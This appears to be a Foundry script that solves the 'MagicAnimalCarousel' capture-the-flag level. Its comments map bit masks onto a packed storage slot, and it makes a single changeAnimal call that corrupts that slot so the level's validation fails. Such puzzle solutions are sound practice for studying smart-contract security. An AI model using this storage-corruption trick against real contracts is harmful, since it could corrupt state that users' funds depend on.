pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";


contract interact is Script
{
//  max capacity: 0x000000000000000000000000000000000000000000000000000000000000ffff
//  animal mask:  0xffffffffffffffffffff00000000000000000000000000000000000000000000 32 bytes
//  next id mask: 0x00000000000000000000ffff0000000000000000000000000000000000000000 22 bytes
//  owner mask:   0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff 20 bytes

    function run() external
    {
        vm.startBroadcast();
        address payable instance = payable(/* instance address */);
        MagicAnimalCarousel carousel = MagicAnimalCarousel(instance);

        // doesnt mess up the next id the way set andAnimalAndSpin does
        // so upon validation "goat" will be written into a non empty slot
        carousel.changeAnimal("anything", 1);
        vm.stopBroadcast();
    }
}
